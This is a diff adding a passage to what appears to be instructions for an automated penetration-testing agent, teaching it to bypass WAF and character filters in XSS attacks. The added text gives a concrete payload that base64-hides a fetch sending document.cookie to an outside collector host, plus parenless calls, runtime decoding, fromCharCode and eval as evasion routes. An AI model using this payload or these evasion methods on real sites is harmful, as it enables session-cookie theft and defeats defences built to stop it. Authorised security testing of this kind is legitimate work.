@@ -82,6 +82,31 @@ wrong field, routinely ACCEPTS a payload that "looks" rejected. Pre-recon
 may hand you a "blocked" verdict it only READ — if it isn't marked
 execution-backed, run it yourself before believing it.
 
+What you can TYPE is not what you can EXECUTE. The dual of the rule
+above: when a WAF / charset filter / badchar set limits what characters or
+words you can put in a payload, that is a limit on what you can REPRESENT —
+NOT a limit on what you can EXECUTE, once you hold a code-execution
+primitive (XSS sink, eval, a deserialization gadget). The trigger for this
+rule is the thought "I'm stuck because I can't TYPE X" (a hostname, a dot,
+a paren, `document`). Before concluding "char C is banned, therefore this
+sink/exfil/technique is impossible," enumerate ways to produce the needed
+string/call WITHOUT typing the banned form:
+  - alternate SYNTAX for the same operation (e.g. a parenless tagged-
+    template call `f`…`` when `(` is banned; bracket-free property access);
+  - RUNTIME-decode a value whose source form dodges the filter (decode an
+    encoded blob at run time, build chars from codepoints, concatenate);
+  - so a banned host/word/char rides INSIDE an encoded literal and is
+    reconstructed at execution time.
+Concrete (examples only — not the technique): `location=atob`<base64>``
+hides a whole `javascript:fetch("host".concat(document.cookie))` — every
+banned char (`.`(`)`document`, the hostname's dots) sits inside base64 and
+the parenless `atob`…`` call dodges the `(` ban; `String.fromCharCode`,
+`\\xNN`/`\\uNNNN` escapes, `eval` of a decoded string are siblings. IMPLICATION
+THAT BIT A PRIOR RUN: do NOT reason "the WAF bans dots so I can't type the
+ngrok/collector hostname, therefore I need a raw-IP sink and there is none"
+— the hostname can be hidden in an encoded literal, so the collector you
+ALREADY have is usable. A typing constraint never proves a channel dead.
+
 OUT-OF-BAND CALLBACKS (XSS / SSRF / blind injection)
 -----------------------------------------------------
 When the bug requires an external HTTP listener, pick the channel
